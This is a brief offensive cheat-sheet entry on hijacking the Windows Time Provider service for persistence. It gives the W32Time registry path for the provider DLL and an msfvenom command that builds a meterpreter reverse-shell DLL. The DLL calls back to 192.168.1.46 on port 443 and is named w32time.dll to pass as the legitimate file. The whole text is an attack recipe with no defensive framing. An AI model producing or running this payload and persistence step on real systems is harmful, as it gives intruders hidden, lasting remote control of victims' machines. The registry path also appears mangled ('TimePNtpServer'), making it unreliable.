# Hijacking Time Provider

time providers retrieve accurate time stamps from hardware or the network, and output time providers provide time stamps to other clients on the network

### Registry Path

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimePNtpServer\
Dllname  = %systemroot%\system32\w32time.dll

### generate malicious payload

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.46 LPORT=443 -f dll > w32time.dll
```
